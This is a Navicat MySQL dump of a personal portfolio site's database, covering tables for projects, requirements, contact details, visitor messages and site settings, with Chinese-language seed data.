/*
 Navicat Premium Dump SQL

 Source Server         : peter
 Source Server Type    : MySQL
 Source Server Version : 50744 (5.7.44-log)
 Source Host           : 129.226.55.102:3306
 Source Schema         : sundongliang

 Target Server Type    : MySQL
 Target Server Version : 50744 (5.7.44-log)
 File Encoding         : 65001

 Date: 03/09/2025 02:47:33
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for admin_log
-- ----------------------------
DROP TABLE IF EXISTS `admin_log`;
CREATE TABLE `admin_log`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '用户名',
  `action` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '操作类型',
  `ip` varchar(45) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL COMMENT 'IP地址',
  `user_agent` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL COMMENT '用户代理',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_username`(`username`) USING BTREE,
  INDEX `idx_action`(`action`) USING BTREE,
  INDEX `idx_create_time`(`create_time`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci COMMENT = '管理员日志表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of admin_log
-- ----------------------------

-- ----------------------------
-- Table structure for contact
-- ----------------------------
DROP TABLE IF EXISTS `contact`;
CREATE TABLE `contact`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '邮箱',
  `wechat` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL COMMENT '微信号',
  `qq` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL COMMENT 'QQ号',
  `address` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL COMMENT '地址',
  `github` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL COMMENT 'GitHub地址',
  `working_hours` json NULL COMMENT '工作时间',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci COMMENT = '联系信息表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of contact
-- ----------------------------
INSERT INTO `contact` VALUES (1, 'cto@cvun.net', 'cto-peters', '213123145', '河南省郑州市', 'https://github.com/petersun', '[{\"day\": \"工作日\", \"time\": \"09:00 - 18:00\"}, {\"day\": \"周六\", \"time\": \"10:00 - 16:00\"}, {\"day\": \"周日\", \"time\": \"休息\"}]', '2025-08-17 17:48:12', '2025-08-25 03:48:05');

-- ----------------------------
-- Table structure for contact_message
-- ----------------------------
DROP TABLE IF EXISTS `contact_message`;
CREATE TABLE `contact_message`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '姓名',
  `email` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '邮箱',
  `subject` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL COMMENT '主题',
  `message` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '留言内容',
  `ip` varchar(45) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL COMMENT 'IP地址',
  `user_agent` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL COMMENT '用户代理',
  `is_read` tinyint(1) NULL DEFAULT 0 COMMENT '是否已读：1已读，0未读',
  `read_time` datetime NULL DEFAULT NULL COMMENT '阅读时间',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_email`(`email`) USING BTREE,
  INDEX `idx_read`(`is_read`) USING BTREE,
  INDEX `idx_create_time`(`create_time`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci COMMENT = '留言表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of contact_message
-- ----------------------------
INSERT INTO `contact_message` VALUES (1, '张三', 'zhangsan@example.com', '项目合作', '您好，我对您的项目很感兴趣，想了解一下合作的可能性。', '127.0.0.1', NULL, 0, NULL, '2025-08-17 17:48:13');
INSERT INTO `contact_message` VALUES (2, '李四', 'lisi@example.com', '技术咨询', '请问您是否接受远程工作？我们公司正在寻找优秀的前端开发者。', '127.0.0.1', NULL, 1, NULL, '2025-08-17 17:48:13');
INSERT INTO `contact_message` VALUES (3, '王五', 'wangwu@example.com', '作品集咨询', '您的作品集设计很棒，想请教一下技术实现方案。', '127.0.0.1', NULL, 1, NULL, '2025-08-17 17:48:13');

-- ----------------------------
-- Table structure for project
-- ----------------------------
DROP TABLE IF EXISTS `project`;
CREATE TABLE `project`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '项目标题',
  `description` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '项目描述',
  `full_description` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL COMMENT '完整描述',
  `image` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL COMMENT '项目图片',
  `category_id` int(11) NOT NULL DEFAULT 1 COMMENT '分类ID',
  `features` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL COMMENT '功能特性，逗号分隔',
  `sort_order` int(11) NULL DEFAULT 0 COMMENT '排序',
  `is_featured` tinyint(1) NULL DEFAULT 0 COMMENT '是否推荐：1是，0否',
  `status` tinyint(1) NULL DEFAULT 1 COMMENT '状态：1发布，0草稿',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_category`(`category_id`) USING BTREE,
  INDEX `idx_status`(`status`) USING BTREE,
  INDEX `idx_featured`(`is_featured`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci COMMENT = '项目表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of project
-- ----------------------------
INSERT INTO `project` VALUES (1, 'LikeSee短视频管理系统', '现代化UI设计，符合2025年审美，基于Vue 3 + Vite，性能卓越', '现代化UI设计，符合2025年审美，基于Vue 3 + Vite，性能卓越', '/static/images/projects/likesee-vue-admin/login.jpg', 1, '', 1, 1, 1, '2025-08-17 17:48:10', '2025-09-01 21:32:45');
INSERT INTO `project` VALUES (2, '数据可视化大屏', '大数据驱动的短视频业务分析系统，提供实时数据监控和可视化', '基于大数据技术构建的业务分析系统，实时收集和处理短视频平台的海量数据，通过直观的图表和仪表盘展示关键业务指标，帮助运营团队快速了解业务状况并做出决策。', 'https://www.sundongliang.cn/static/images/projects/data-visualization/index.jpg', 4, '实时数据监控,多维度分析,自定义图表,数据导出功能,告警系统,历史数据查询', 2, 1, 1, '2025-08-17 17:48:10', '2025-08-31 04:19:50');

-- ----------------------------
-- Table structure for project_category
-- ----------------------------
DROP TABLE IF EXISTS `project_category`;
CREATE TABLE `project_category`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '分类名称',
  `key` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '分类标识',
  `description` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT '' COMMENT '分类描述',
  `sort_order` int(11) NULL DEFAULT 0 COMMENT '排序',
  `status` tinyint(1) NULL DEFAULT 1 COMMENT '状态：1启用，0禁用',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `uk_key`(`key`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci COMMENT = '项目分类表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of project_category
-- ----------------------------
INSERT INTO `project_category` VALUES (1, 'Web开发', 'web', '', 1, 1, '2025-08-17 17:48:09', '2025-08-17 17:48:09');
INSERT INTO `project_category` VALUES (2, '移动开发', 'mobile', '', 2, 1, '2025-08-17 17:48:09', '2025-08-17 17:48:09');
INSERT INTO `project_category` VALUES (3, 'UI设计', 'design', '', 3, 1, '2025-08-17 17:48:09', '2025-08-17 17:48:09');
INSERT INTO `project_category` VALUES (4, '数据分析', 'data', '', 4, 1, '2025-08-17 17:48:09', '2025-08-17 17:48:09');

-- ----------------------------
-- Table structure for project_images
-- ----------------------------
DROP TABLE IF EXISTS `project_images`;
CREATE TABLE `project_images`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) NOT NULL COMMENT '项目ID',
  `image_url` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '图片URL',
  `sort_order` int(11) NULL DEFAULT 0 COMMENT '排序',
  `create_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_project_id`(`project_id`) USING BTREE,
  INDEX `idx_project_sort`(`project_id`, `sort_order`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 13 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci COMMENT = '项目图片表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of project_images
-- ----------------------------
INSERT INTO `project_images` VALUES (10, 1, '/static/images/projects/likesee-vue-admin/login.jpg', 0, '2025-09-01 21:32:45');
INSERT INTO `project_images` VALUES (11, 1, '/static/images/projects/project_68a9e7dde5031.jpg', 1, '2025-09-01 21:32:46');
INSERT INTO `project_images` VALUES (12, 1, '/static/images/projects/project_68a9e7ee77c10.jpg', 2, '2025-09-01 21:32:46');

-- ----------------------------
-- Table structure for project_requirements
-- ----------------------------
DROP TABLE IF EXISTS `project_requirements`;
CREATE TABLE `project_requirements`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) NOT NULL COMMENT '项目ID',
  `title` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '需求标题',
  `description` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '需求描述',
  `status` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT 'pending' COMMENT '需求状态',
  `priority` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT 'medium' COMMENT '优先级',
  `estimated_hours` decimal(8, 2) NULL DEFAULT NULL COMMENT '预估工时',
  `actual_hours` decimal(8, 2) NULL DEFAULT NULL COMMENT '实际工时',
  `assignee` int(11) NULL DEFAULT NULL COMMENT '负责人',
  `assignee_id` int(11) NULL DEFAULT NULL COMMENT '负责人id',
  `template_id` int(11) NULL DEFAULT NULL COMMENT '需求模板ID',
  `create_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_project_id`(`project_id`) USING BTREE,
  INDEX `idx_status`(`status`) USING BTREE,
  INDEX `idx_priority`(`priority`) USING BTREE,
  INDEX `idx_assignee`(`assignee`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 19 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of project_requirements
-- ----------------------------
INSERT INTO `project_requirements` VALUES (1, 1, '用户界面设计', '设计个人作品集网站的用户界面，包括首页、项目展示页、联系页面等', 'completed', 'high', 16.00, 18.50, NULL, 1, 1, '2025-09-02 15:29:45', '2025-09-02 16:53:31');
INSERT INTO `project_requirements` VALUES (2, 1, '响应式布局实现', '实现网站的响应式布局，确保在不同设备上都能正常显示', 'completed', 'high', 12.00, 10.00, NULL, 1, 4, '2025-09-02 15:29:45', '2025-09-02 16:53:51');
INSERT INTO `project_requirements` VALUES (3, 1, '项目展示功能', '实现项目列表展示、详情查看、分类筛选等功能', 'progress', 'medium', 8.00, 5.50, NULL, 1, 4, '2025-09-02 15:29:45', '2025-09-02 16:53:51');
INSERT INTO `project_requirements` VALUES (4, 1, '后台管理系统', '开发后台管理系统，支持内容管理、用户管理等功能', 'pending', 'medium', 20.00, 0.00, NULL, 1, 3, '2025-09-02 15:29:45', '2025-09-02 16:53:51');
INSERT INTO `project_requirements` VALUES (5, 1, '数据统计功能', '实现访问统计、用户行为分析等数据统计功能', 'pending', 'low', 6.00, 0.00, NULL, 1, 3, '2025-09-02 15:29:45', '2025-09-02 16:53:51');
INSERT INTO `project_requirements` VALUES (6, 1, '商品管理模块', '开发商品增删改查、分类管理、库存管理等功能', 'completed', 'high', 24.00, 26.00, NULL, 1, 3, '2025-09-02 15:29:45', '2025-09-02 16:53:52');
INSERT INTO `project_requirements` VALUES (7, 1, '订单处理系统', '实现订单创建、支付、发货、退款等完整流程', 'progress', 'high', 32.00, 15.00, NULL, 1, 3, '2025-09-02 15:29:45', '2025-09-02 16:53:52');
INSERT INTO `project_requirements` VALUES (8, 1, '用户权限管理', '实现用户角色管理、权限控制等功能', 'pending', 'medium', 16.00, 0.00, NULL, 1, 3, '2025-09-02 15:29:45', '2025-09-02 16:53:52');
INSERT INTO `project_requirements` VALUES (9, 1, '用户注册登录', '实现用户注册、登录、密码找回等功能', 'completed', 'high', 12.00, 14.00, NULL, 1, 3, '2025-09-02 15:29:45', '2025-09-02 16:53:52');
INSERT INTO `project_requirements` VALUES (10, 1, '内容展示功能', '实现内容浏览、搜索、分类等功能', 'progress', 'medium', 16.00, 8.00, NULL, 1, 4, '2025-09-02 15:29:45', '2025-09-02 16:53:52');
INSERT INTO `project_requirements` VALUES (11, 1, '消息推送系统', '集成消息推送服务，支持实时通知', 'pending', 'low', 8.00, 0.00, NULL, 1, 3, '2025-09-02 15:29:45', '2025-09-02 16:53:52');
INSERT INTO `project_requirements` VALUES (12, 1, '用户界面设计', '设计个人作品集网站的用户界面，包括首页、项目展示页、联系页面等', 'completed', 'medium', NULL, NULL, NULL, 1, NULL, '2025-09-02 16:21:53', '2025-09-02 16:53:52');
INSERT INTO `project_requirements` VALUES (17, 1, '用户界面设计', '设计个人作品集网站的用户界面，包括首页、项目展示页、联系页面等', 'completed', 'medium', NULL, NULL, 0, 1, NULL, '2025-09-02 16:31:33', '2025-09-02 16:31:33');
INSERT INTO `project_requirements` VALUES (18, 1, '用户界面设计', '设计个人作品集网站的用户界面，包括首页、项目展示页、联系页面等', 'completed', 'medium', NULL, NULL, 0, 1, NULL, '2025-09-02 16:44:04', '2025-09-02 16:51:42');

-- ----------------------------
-- Table structure for project_tag
-- ----------------------------
DROP TABLE IF EXISTS `project_tag`;
CREATE TABLE `project_tag`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) NOT NULL COMMENT '项目ID',
  `tag_id` int(11) NOT NULL COMMENT '标签ID',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `uk_project_tag`(`project_id`, `tag_id`) USING BTREE,
  INDEX `idx_project`(`project_id`) USING BTREE,
  INDEX `idx_tag`(`tag_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 25 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci COMMENT = '项目标签关联表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of project_tag
-- ----------------------------
INSERT INTO `project_tag` VALUES (22, 1, 1);
INSERT INTO `project_tag` VALUES (23, 1, 2);
INSERT INTO `project_tag` VALUES (24, 1, 3);
INSERT INTO `project_tag` VALUES (4, 2, 4);
INSERT INTO `project_tag` VALUES (5, 2, 5);
INSERT INTO `project_tag` VALUES (6, 2, 6);

-- ----------------------------
-- Table structure for project_technology
-- ----------------------------
DROP TABLE IF EXISTS `project_technology`;
CREATE TABLE `project_technology`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) NOT NULL COMMENT '项目ID',
  `technology_id` int(11) NOT NULL COMMENT '技术栈ID',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `uk_project_tech`(`project_id`, `technology_id`) USING BTREE,
  INDEX `idx_project`(`project_id`) USING BTREE,
  INDEX `idx_technology`(`technology_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 42 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci COMMENT = '项目技术栈关联表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of project_technology
-- ----------------------------
INSERT INTO `project_technology` VALUES (37, 1, 1);
INSERT INTO `project_technology` VALUES (38, 1, 2);
INSERT INTO `project_technology` VALUES (39, 1, 3);
INSERT INTO `project_technology` VALUES (40, 1, 4);
INSERT INTO `project_technology` VALUES (41, 1, 5);
INSERT INTO `project_technology` VALUES (8, 2, 4);
INSERT INTO `project_technology` VALUES (6, 2, 6);
INSERT INTO `project_technology` VALUES (7, 2, 7);
INSERT INTO `project_technology` VALUES (9, 2, 8);
INSERT INTO `project_technology` VALUES (10, 2, 9);

-- ----------------------------
-- Table structure for requirement_attachments
-- ----------------------------
DROP TABLE IF EXISTS `requirement_attachments`;
CREATE TABLE `requirement_attachments`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `requirement_id` int(11) NOT NULL COMMENT '需求ID',
  `filename` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '文件名',
  `original_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '原始文件名',
  `file_path` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '文件路径',
  `file_size` bigint(20) NULL DEFAULT NULL COMMENT '文件大小',
  `file_type` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '文件类型',
  `uploader` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '上传者',
  `create_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_requirement_id`(`requirement_id`) USING BTREE,
  INDEX `idx_uploader`(`uploader`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of requirement_attachments
-- ----------------------------

-- ----------------------------
-- Table structure for requirement_comments
-- ----------------------------
DROP TABLE IF EXISTS `requirement_comments`;
CREATE TABLE `requirement_comments`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `requirement_id` int(11) NOT NULL COMMENT '需求ID',
  `parent_id` int(11) NULL DEFAULT NULL COMMENT '父评论ID',
  `content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '评论内容',
  `author` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '评论者',
  `author_avatar` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '评论者头像',
  `is_system` tinyint(1) NULL DEFAULT 0 COMMENT '是否系统评论',
  `create_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_requirement_id`(`requirement_id`) USING BTREE,
  INDEX `idx_parent_id`(`parent_id`) USING BTREE,
  INDEX `idx_author`(`author`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of requirement_comments
-- ----------------------------

-- ----------------------------
-- Table structure for requirement_templates
-- ----------------------------
DROP TABLE IF EXISTS `requirement_templates`;
CREATE TABLE `requirement_templates`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '模板名称',
  `title_template` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '标题模板',
  `description_template` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '描述模板',
  `category` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '模板分类',
  `is_system` tinyint(1) NULL DEFAULT 0 COMMENT '是否系统模板',
  `usage_count` int(11) NULL DEFAULT 0 COMMENT '使用次数',
  `create_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_category`(`category`) USING BTREE,
  INDEX `idx_is_system`(`is_system`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 6 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of requirement_templates
-- ----------------------------
INSERT INTO `requirement_templates` VALUES (1, '用户界面设计', '设计{项目名称}的用户界面', '设计{项目名称}的用户界面，包括以下页面：\n1. 首页设计\n2. 主要功能页面\n3. 用户交互流程\n4. 响应式适配\n\n设计要求：\n- 符合现代设计趋势\n- 用户体验友好\n- 品牌风格统一', 'UI设计', 1, 0, '2025-09-02 15:12:50', '2025-09-02 15:12:50');
INSERT INTO `requirement_templates` VALUES (2, '数据库设计', '设计{项目名称}的数据库结构', '设计{项目名称}的数据库结构，包括：\n1. 核心数据表设计\n2. 表关系设计\n3. 索引优化\n4. 数据安全考虑\n\n技术要求：\n- 符合第三范式\n- 性能优化\n- 数据完整性', '后端开发', 1, 0, '2025-09-02 15:12:50', '2025-09-02 15:12:50');
INSERT INTO `requirement_templates` VALUES (3, 'API接口开发', '开发{项目名称}的API接口', '开发{项目名称}的API接口，包括：\n1. RESTful API设计\n2. 接口文档编写\n3. 错误处理机制\n4. 接口测试\n\n技术要求：\n- 遵循REST规范\n- 统一响应格式\n- 完善的错误处理', '后端开发', 1, 0, '2025-09-02 15:12:50', '2025-09-02 15:12:50');
INSERT INTO `requirement_templates` VALUES (4, '前端页面开发', '开发{项目名称}的前端页面', '开发{项目名称}的前端页面，包括：\n1. 页面结构搭建\n2. 样式设计实现\n3. 交互功能开发\n4. 浏览器兼容性\n\n技术要求：\n- 响应式设计\n- 性能优化\n- 代码规范', '前端开发', 1, 0, '2025-09-02 15:12:50', '2025-09-02 15:12:50');
INSERT INTO `requirement_templates` VALUES (5, '功能测试', '对{项目名称}进行功能测试', '对{项目名称}进行全面的功能测试，包括：\n1. 功能点测试\n2. 边界条件测试\n3. 异常情况测试\n4. 性能测试\n\n测试要求：\n- 测试用例完整\n- 覆盖率达标\n- 缺陷跟踪', '测试', 1, 0, '2025-09-02 15:12:50', '2025-09-02 15:12:50');

-- ----------------------------
-- Table structure for requirement_time_logs
-- ----------------------------
DROP TABLE IF EXISTS `requirement_time_logs`;
CREATE TABLE `requirement_time_logs`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `requirement_id` int(11) NOT NULL COMMENT '需求ID',
  `user_name` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '记录者',
  `hours` decimal(8, 2) NOT NULL COMMENT '工时',
  `description` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '工时描述',
  `log_date` date NOT NULL COMMENT '工时日期',
  `create_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_requirement_id`(`requirement_id`) USING BTREE,
  INDEX `idx_user_name`(`user_name`) USING BTREE,
  INDEX `idx_log_date`(`log_date`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of requirement_time_logs
-- ----------------------------

-- ----------------------------
-- Table structure for system_settings
-- ----------------------------
DROP TABLE IF EXISTS `system_settings`;
CREATE TABLE `system_settings`  (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键ID',
  `setting_key` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '设置键名',
  `setting_value` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL COMMENT '设置值',
  `setting_type` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT 'string' COMMENT '设置类型：string, int, bool, json',
  `description` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT '' COMMENT '设置描述',
  `group_name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT 'basic' COMMENT '设置分组：basic, display, security, backup, system',
  `is_system` tinyint(1) NULL DEFAULT 0 COMMENT '是否系统设置：1是，0否',
  `created_at` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updated_at` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `setting_key`(`setting_key`) USING BTREE,
  INDEX `idx_group_name`(`group_name`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 19 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci COMMENT = '系统设置表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of system_settings
-- ----------------------------
INSERT INTO `system_settings` VALUES (1, 'site_name', '解忧青年作品集', 'string', '网站名称', 'basic', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (2, 'site_description', '一位热衷于创建视觉元素、主题制作和嵌入式开发的全栈工程师。', 'string', '网站描述', 'basic', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (3, 'site_keywords', '作品集,前端开发,Vue,React,项目展示', 'string', '网站关键词', 'basic', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (4, 'subdescription', '乔布斯于科技世界种下创新种子，罗永浩在行业浪潮里坚守情怀高地，都让我着迷。我仿佛看到老罗和乔布斯在科技和人文的十字路口探讨人生，所以我带着这份情怀，期待在这里与你相遇。', 'string', '网站副描述', 'basic', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (5, 'projects_per_page', '9', 'int', '每页显示项目数', 'display', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (6, 'enable_comments', '1', 'bool', '启用评论功能', 'display', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (7, 'enable_sharing', '1', 'bool', '启用分享功能', 'display', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (8, 'login_lock', '1', 'bool', '登录失败锁定', 'security', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (9, 'session_timeout', '3600', 'int', '会话超时时间（秒）', 'security', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (10, 'max_login_attempts', '5', 'int', '最大登录尝试次数', 'security', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (11, 'lockout_duration', '1800', 'int', '锁定持续时间（秒）', 'security', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (12, 'auto_backup', '1', 'bool', '自动备份', 'backup', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
INSERT INTO `system_settings` VALUES (13, 'backup_frequency', 'weekly', 'string', '备份频率', 'backup', 0, '2025-09-01 14:10:30', '2025-09-01 14:10:30');
